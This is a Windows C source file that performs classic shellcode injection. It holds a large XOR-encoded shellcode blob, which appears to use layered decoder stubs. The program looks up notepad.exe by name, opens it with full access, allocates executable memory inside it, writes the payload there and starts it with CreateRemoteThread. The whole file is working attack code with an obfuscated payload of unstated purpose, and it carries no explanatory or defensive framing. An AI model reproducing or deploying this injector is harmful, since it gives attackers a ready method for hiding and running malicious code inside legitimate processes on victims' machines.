﻿#include <stdio.h>
#include <Windows.h>
#include <Tlhelp32.h>
char shellcode[] = ("\xeb\x27\x5b\x53\x5f\xb0\x92\xfc\xae\x75\xfd\x57\x59\x53\x5e"
"\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\x97\xa0"
"\x74\x07\x80\x3e\x92\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff"
"\xff\x01\x02\x04\x92\xea\x25\x5f\x52\x5d\xb4\xc1\xfe\xaa\x74"
"\xff\x53\x58\x51\x5a\x8b\x04\x34\x06\x4a\xfb\xc6\x4a\xfb\xc7"
"\x64\x85\x3e\x1a\x79\x75\x05\x84\x3f\xc2\x71\xeb\xe9\xe2\xfe"
"\xe3\xec\xd5\xfd\xfb\xfe\x06\x05\x03\xc2\xeb\x27\x5b\x53\x5f"
"\xb0\xb4\xfc\xae\x75\xfd\x57\x59\x53\x5e\x8a\x06\x30\x07\x48"
"\xff\xc7\x48\xff\xc6\x66\x81\x3f\xc9\x7d\x74\x07\x80\x3e\xb4"
"\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff\xff\x10\x04\x1a\xb4"
"\xfb\x23\x41\x43\x5b\xaa\xe1\xf8\xb4\x65\xf9\x4d\x49\x57\x44"
"\x9a\x02\x2a\x17\x4c\xe5\xd7\x4c\xe5\xd6\x62\x9b\x2f\x99\x5e"
"\x64\x03\x9a\x2e\xf5\x6f\xfa\xef\xfc\xef\xe5\xf2\xc4\xfb\xe5"
"\xef\x05\x18\xe1\xee\x3f\x4a\x55\x44\xa2\xdd\xe4\xbf\x73\xe6"
"\x45\x5c\x4b\x4f\x8c\x1d\x22\x02\x50\xee\xc1\x53\xed\xc3\x7e"
"\x90\x39\x63\xa5\x71\x1f\x91\x38\xc3\x67\xef\xf3\xf7\xf9\xfa"
"\xfa\xd1\xe7\xee\xf9\x19\x13\xdd\xf1\x37\x5f\x49\x4f\xb4\xcf"
"\xec\xaa\x6f\xed\x53\x43\x43\x5a\x90\x16\x34\x1d\x58\xfb\xdd"
"\x58\xfb\xdc\x76\x85\x25\xf6\xdf\x6e\x17\x84\x24\xc5\x71\xf0"
"\xfb\xe2\xe5\xf1\xec\xce\xef\xfb\xe5\x11\x06\xcf\xfa\x21\x40"
"\x41\x5a\xa8\x60\xfa\xb5\x67\xf8\x4f\x48\x55\x45\x98\x03\x28"
"\x16\x4e\xe4\xd5\x4d\xe7\xd7\x60\x9a\x2d\xa7\xf3\x65\x01\x9b"
"\x2c\x74\x6d\xfb\xed\xfd\xed\xe4\xf0\xc5\xf9\xe4\xed\x07\x19"
"\x60\xef\x3d\x4b\x57\x45\xa0\x52\xe6\xbe\x71\xe7\x47\x5d\x49"
"\x4e\x8e\x1c\x20\x03\x52\xef\xc3\x52\xef\xc2\x7c\x91\x3b\xdd"
"\x92\x70\x1d\x90\x3a\x4c\x65\xee\xf1\xf6\xfb\xfb\xf8\xd0\xe5"
"\xef\xfb\x08\x12\x52\xe3\x35\x4d\x4b\x5d\xb6\xdc\xee\xb8\x6d"
"\xff\x51\x51\x41\x48\x92\x04\x36\x0f\x5a\xe9\xdf\x4a\xf9\xce"
"\x74\x97\x27\xb3\xa1\x7c\x15\x96\x26\xd6\x73\xe2\xf9\xf0\xe7"
"\xe3\xee\xdc\xed\xe9\xe7\xcb\xd2\x2a\xfc\x84\x82\x94\x7f\xe6"
"\x27\x71\xa4\x36\x98\x98\x88\x81\x5b\xcd\xff\xc6\x93\x20\x16"
"\x83\x30\x07\xbd\x5e\xee\xa1\x08\xb5\xdc\x5f\xef\xec\xba\x2b"
"\x30\x39\x2e\x2a\x27\x15\x24\x20\x2e\x93\xe8\x72\xa4\xdc\xda"
"\xcc\x27\x3b\x7f\x29\xfc\x6e\xc0\xc0\xd0\xd9\x03\x95\xa7\x9e"
"\xcb\x78\x4e\xdb\x68\x5f\xe5\x06\xb6\xa0\x9f\xed\x84\x07\xb7"
"\x31\xe2\x73\x68\x61\x76\x72\x7f\x4d\x7c\x78\x76\x84\x35\x65"
"\xb3\xcb\xcd\xdb\x30\xf5\x68\x3e\xeb\x79\xd7\xd7\xc7\xce\x14"
"\x82\xb0\x89\xdc\x6f\x59\xcc\x7f\x48\xf2\x11\xa1\xe7\x5f\xfa"
"\x93\x10\xa0\xff\xf5\x64\x7f\x76\x61\x65\x68\x5a\x6b\x6f\x61"
"\x8b\xfb\x6a\xbc\xc4\xc2\xd4\x3f\x57\x67\x31\xe4\x76\xd8\xd8"
"\xc8\xc1\x1b\x8d\xbf\x86\xd3\x60\x56\xc3\x70\x47\xfd\x1e\xae"
"\xf3\x9e\xf5\x9c\x1f\xaf\x5d\xfa\x6b\x70\x79\x6e\x6a\x67\x55"
"\x64\x60\x6e\xa8\x59\x49\x9f\xe7\xe1\xf7\x1c\xb2\x44\x12\xc7"
"\x55\xfb\xfb\xeb\xe2\x38\xae\x9c\xa5\xf0\x43\x75\xe0\x53\x64"
"\xde\x3d\x8d\xae\x44\xd6\xbf\x3c\x8c\xb8\xd9\x48\x53\x5a\x4d"
"\x49\x44\x76\x47\x43\x4d\xab\xbc\x4a\x9c\xe4\xe2\xf4\x1f\x3d"
"\x47\x11\xc4\x56\xf8\xf8\xe8\xe1\x3b\xad\x9f\xa6\xf3\x40\x76"
"\xe3\x50\x67\xdd\x3e\x8e\x04\x53\xd5\xbc\x3f\x8f\x37\xda\x4b"
"\x50\x59\x4e\x4a\x47\x75\x44\x40\x4e\xbb\x33\x4d\xe3\x2e\x45"
"\x4b\x40\x4e\x54\x47\x71\xbb\xbf\xb1\xea\xfe\xe0\xeb\xed\xe0"
"\xfd\xe7\x90\x69\xda\xf9\x20\xfd\xc1\x85\xf7\x3a\xf9\xb7\x9f"
"\xf3\x34\xe3\x8b\x91\xe9\x30\xcd\xe1\x95\xe7\xae\x0c\xf5\xfb"
"\xe6\x9e\x68\xf3\x8e\x71\x07\x93\xc0\xc7\xbd\x9d\x8b\xee\x60"
"\x72\xb2\xf0\xaa\x6e\x43\x56\xed\xf0\xfa\x91\xe9\x30\xed\x91"
"\x95\x24\xe3\x87\xf7\xb0\x7b\x91\x2a\x3b\x37\xb1\xab\xaf\xe9"
"\x3e\x7f\xc5\xc4\xe7\xa0\x6b\xef\x8f\x20\xe7\xb9\x85\xfb\x3a"
"\xeb\x8f\xe8\xba\x6f\x52\xf7\xe7\x5e\x72\x81\xf0\x20\x9b\x29"
"\xf3\xbe\x67\xe6\x9e\x68\xf3\x8e\x71\x07\xee\x60\x72\xb2\xf0"
"\xaa\x6e\x99\x5b\xca\x40\x95\xe3\xa2\xf7\x9b\xb9\xee\x96\x70"
"\xce\x69\xe9\x95\xeb\x2a\xfb\x9b\xf8\xaa\x7f\xc7\x85\xfe\x3a"
"\xa7\xe7\x9f\xff\x34\xf1\xb7\xe6\xa0\x6b\x81\xf0\x20\xab\x29"
"\xf3\xbe\x61\xea\xf7\xe0\xe3\xe1\xe8\xf1\xee\xf9\xfa\xe6\xf0"
"\xf1\xe7\x22\x57\x9f\xf0\xf9\x50\x41\xe3\xfe\xe8\xf1\x91\xe9"
"\x30\xad\x58\xe2\x50\x5e\x44\xe2\xf8\x6c\x6e\xa1\xbb\xbf\xb1"
"\x95\xe7\x2c\x2e\x41\xb1\xab\xaf\x9f\xf7\x32\x34\xa4\xae\xa1"
"\xbb\xf7\x80\x62\xee\x1b\xfe\x3c\xe7\xac\x50\x74\xf3\x8e\x78"
"\xea\x15\x51\x0e\x1d\xe7\x54\x7a\xe9\xde\xd3\xdd\xc4\x83\x81"
"\xdd\xcd\xde\xc6\x8f\xec\xe8\xf9\x90\xab\xe2\xc4\xc8\xcc\xd0"
"\xcc\xca\xe3\xd4\xc7\xb1\x14\x43\xb4\x40\xf7\x90\xf7\x4f\xba"
"\x9b\xa5\x06\xa3\xb1\xdd\x92\xa4\xf0\xf6\xdf\x60\xa6\x99\x5e"
"\xc9\x7d\x19\x7f\x97\xa0");

DWORD GetProcessIdByName(LPCTSTR lpszProcessName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof pe;

	if (Process32First(hSnapshot, &pe))
	{
		do {
			if (lstrcmpi(lpszProcessName, pe.szExeFile) == 0)
			{
				CloseHandle(hSnapshot);
				return pe.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &pe));
	}

	CloseHandle(hSnapshot);
	return 0;
}

int main()
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, GetProcessIdByName((LPCTSTR)"notepad.exe"));
    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, 0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, lpBaseAddress, shellcode, sizeof(shellcode), NULL);
    CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, 0, 0, 0);
    return 0;
}
